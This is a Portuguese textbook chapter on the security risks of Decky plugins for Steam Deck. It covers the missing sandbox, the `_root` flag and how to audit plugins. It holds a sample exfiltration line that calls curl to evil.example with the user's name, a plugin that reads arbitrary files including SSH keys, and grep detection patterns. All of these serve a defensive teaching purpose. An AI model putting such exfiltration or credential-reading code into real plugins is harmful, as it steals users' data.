Um plugin do Decky não é um arquivo de tema inofensivo. É um programa executável rodando na sua máquina, com acesso à sua conta Steam logada, ao seu home e — se declarar a flag certa — ao sistema inteiro. O model de permissões do Decky é fino, quase informal, e por isso entender exatamente o que a flag `_root` concede, o que o backend pode tocar e como mitigar o risco é uma das habilidades mais importantes deste capítulo.

:::objetivos
- Entender o modelo de confiança do Decky: código arbitrário, não sandbox
- Diferenciar um plugin comum (roda como `deck`) de um plugin com flag `_root`
- Ler as consequências concretas da flag `_root` no `plugin.json`
- Reconhecer padrões suspeitos em plugins que pedem mais do que precisam
- Aplicar uma política pessoal de segurança ao instalar e atualizar plugins
:::

## O modelo de confiança: não há sandbox

A pergunta mais honesta que você pode fazer sobre o Decky é: qual é a caixa de areia (sandbox) que isola um plugin do resto do sistema? A resposta: **não há**. Um plugin do Decky tem os mesmos privilégios do usuário que o executa.

Isso é diferente de um flatpak — o formato que o SteamOS usa para aplicativos de desktop —, que isola cada app num contêiner com permissões explícitas e revogáveis. O Decky não usa flatpak. O backend de um plugin é Python rodando direto no sistema, com `$HOME` apontando para `/home/deck` e, portanto, leitura e escrita em tudo que o usuário `deck` pode tocar:

- Sua biblioteca e saves em `~/.local/share/Steam/`;
- Seus arquivos em `~/Documents`, `~/Downloads`, `~/Pictures`;
- Sua chave SSH em `~/.ssh/`, seu histórico do shell, seus tokens de login.

Isso não torna o Decky inseguro por si só — o mesmo seria verdade de qualquer programa que você roda como `deck`. Mas a diferença prática é que a loja do Decky torna trivial instalar software de terceiros que, diferentemente de um flatpak, **não declara formalmente o que pode acessar**. A segurança depende da sua discrição, não de um sistema de permissões.

:::info
O Flatpak, que o SteamOS usa para o Discover e para o restante do desktop, tem um modelo de permissões revogável — você vê o que o app pode acessar e nega individualmente. O Decky segue um modelo oposto: confiança total no autor. Os dois convivem no mesmo sistema, mas a postura que você adota para cada um precisa ser diferente.
:::

## O usuário `deck` e a flag `_root`

Por padrão, o backend de um plugin roda como o usuário `deck` — o mesmo usuário do Game Mode. Isso já é muito: é a conta que possui os saves, os jogos e a sessão Steam. Mas há uma flag que eleva o privilégio ao máximo:

```json
{
  "name": "Plugin Exemplo",
  "author": "autor",
  "flags": ["_root"],
  "api_version": 1
}
```

Com `"flags": ["_root"]`, o `plugin_loader` executa o `main.py` do plugin como **root** — o superusuário, com acesso irrestrito a cada arquivo, processo e dispositivo do sistema. No SteamOS, isso é ainda mais sensível do que num Linux normal, porque estar como root permite, na prática, montar a partição raiz como leitura-escrita e burlar a imutabilidade que protege o sistema de modificações acidentais (ou maliciosas).

```terminal
$ ps aux | grep main.py
deck     2912  0.3  0.4  10300  4100 ?  Ssl  18:02  python ~/homebrew/plugins/PluginComum/main.py
root     3150  0.1  0.3   9800  3200 ?  Ssl  18:03  python ~/homebrew/plugins/PluginRoot/main.py
```

Repare na primeira coluna: `deck` para o plugin comum, `root` para o que declarou `_root`. É a diferença, em termos de dano potencial, entre "ler seu save" e "apagar o sistema inteiro".

Existem motivos legítimos para `_root` — plugins que alteram animação de boot, que mexem em parâmetros de kernel ou que gerenciam montagem de unidades de armazenamento precisam de mais do que o usuário `deck` permite. O problema não é a flag existir; é um plugin de propósito banal pedir root sem necessidade.

:::atencao
A primeira coisa a conferir ao considerar um plugin é se `flags` contém `_root`. Se um plugin de "tema visual" ou de "exibição de FPS" pede root, isso é um sinal de alerta forte — esses propósitos não exigem privilégio de superusuário. Desconfie e procure alternativa.
:::

## O que o backend pode fazer de verdade

Para calibrar o risco, veja em termos concretos o que alcança um backend rodando como `deck` (o caso padrão):

```terminal
$ cat ~/homebrew/plugins/PluginComum/main.py
import decky
import os

class Plugin:
    async def list_home(self):
        return os.listdir(os.path.expanduser("~"))

    async def read_file(self, path):
        with open(path) as f:
            return f.read()
```

Esse plugin lê qualquer arquivo que o `deck` possa ler — incluindo `~/.ssh/id_rsa`, se existir, e os tokens de autenticação do Steam. Nada disso gera alerta, nenhuma permissão é solicitada, nenhum registro fica no sistema. Por isso a regra de ouro que abre esta seção: **a confiança está no autor, não no sistema**.

Da perspectiva do desenvolvedor honesto, o acesso amplo é um recurso — permite ler métricas de hardware, gravar gameplay, gerenciar arquivos. Da perspectiva do usuário, é um voto de confiança cego que só faz sentido quando a origem é verificável: autor conhecido, repositório com histórico aberto, código que você (ou a comunidade) já leu.

## Padrões que devem acender o alerta

Ao auditar um plugin, alguns sinais são estatisticamente correlacionados com código mal-intencionado:

| Sinal | Por quê é suspeito |
|---|---|
| `_root` em plugin de escopo banal | Escalada de privilégio sem necessidade funcional |
| Rede para domínios desconhecidos no `_main` | Exfiltração de dados em segundo plano |
| `subprocess`/`os.system` com strings não documentadas | Execução de comandos arbitrários disfarçada |
| Leitura de `~/.ssh/`, `~/.config/`, bancos de senha | Coleta de credenciais |
| Autor recém-criado, repositório sem histórico | Difícil verificar intenção |

```terminal
$ grep -nE "subprocess|os\.system|eval\(|exec\(" ~/homebrew/plugins/*/main.py
/home/deck/homebrew/plugins/PluginSuspeito/main.py:12:    os.system(f"curl -s evil.example/{decky.DECKY_USER}")
```

Um padrão como o da última linha — rodar `os.system` com interpolação que embute dados do usuário e aponta para um domínio externo — é o tipo de coisa que nenhum plugin honesto precisa fazer. Se sua auditoria encontrar algo assim, não instale (ou desative imediatamente).

## Construindo uma política pessoal

Nenhuma ferramenta substitui um conjunto de regras que você aplica sempre. Uma política razoável para o deck:

1. **Só loja oficial ou autores verificados.** Prefira plugins do catálogo `plugin.steamdeckhomebrew.sh` que apontem para repositórios de autores com presença estabelecida na comunidade.
2. **`_root` só com justificativa forte e fonte conhecida.** Se o propósito não explica o root, passe.
3. **Audite antes de instalar e a cada atualização.** O `grep` da seção 4 é o mínimo.
4. **Desative o que não usa.** Plugins desativados não rodam; menos superfície de ataque.
5. **Não rode o deck como root cotidianamente.** Manter a conta `deck` separada do root limita o dano de qualquer plugin malicioso.

:::perigo
Evite instalar plugins de forks "turbinados" de projetos populares que não sejam o repositório original. Fork é exatamente o vetor que um atacante usa: pega um plugin confiável, injeta código de roubo de sessão, e publica num repositório parecido esperando que alguém instale pela URL.
:::

## Resumo

- O Decky não usa sandbox: um plugin roda com os mesmos privilégios do usuário `deck`, sem permissões revogáveis.
- Isso contrasta com o flatpak do SteamOS, que isola apps com permissões explícitas.
- A flag `_root` no `plugin.json` executa o backend como superusuário; é a diferença entre ler um save e destruir o sistema.
- Auditar `plugin.json` (flag `_root`) e `main.py` (rede, `subprocess`, leitura de credenciais) é o mínimo antes de confiar.
- Adotar uma política pessoal — loja oficial, root justificado, plugindesativados, conta não-root — reduz a superfície de risco.

## Exercícios

1. Liste todos os plugins instalados e, para cada um, leia `flags` do `plugin.json`. Algum usa `_root`? Se sim, o propósito justifica?
2. Conecte-se ao deck e rode `ps aux | grep main.py` no momento em que há plugins ativos. Confira a primeira coluna de cada processo: `deck` ou `root`? A que você atribui a diferença?
3. Use `grep` para varrer todos os `main.py` de `~/homebrew/plugins/` por `subprocess`, `os.system`, `eval` e `exec`. Reporte cada ocorrência e julgue se é legítima.
4. Compare o modelo de permissões do Decky com o de um flatpak instalado (use `flatpak info --show-permissions <appid>`). Quais permissões o flatpak expõe que o Decky não expõe?
5. **Desafio.** Crie um plugin de teste (pode ser o esqueleto mínimo da seção 9) que, no `main.py`, tente ler `~/.ssh/id_rsa` e logar o primeiro caractere. Observe que nada o impede. Escreva uma reflexão de um parágrafo sobre o que isso ensina a respeito do modelo de confiança do Decky.
